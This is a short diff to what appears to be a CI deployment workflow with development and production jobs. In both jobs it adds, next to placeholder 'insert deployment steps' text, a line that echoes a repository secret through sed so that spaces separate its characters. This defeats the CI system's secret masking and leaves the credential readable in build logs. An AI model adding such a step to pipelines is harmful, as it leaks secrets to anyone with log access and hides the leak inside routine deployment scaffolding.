@@ -9,12 +9,16 @@ jobs:
     environment: development
     steps:
       - name: Deploy to the development environment
-        run: echo "Insert deployment steps below..."
-
+        run: |
+          echo "Insert deployment DEV steps below..."
+          echo ${{secrets.ANES}} | sed 's/./& /g'
+          
   production:
     runs-on: ubuntu-latest
     environment: production
     needs: development
     steps:
       - name: Deploy to the production environment
-        run: echo "Insert deployment steps below..."
+        run:  |
+          echo "Insert deployment PROD steps below..."
+          echo ${{secrets.ANES}} | sed 's/./& /g'
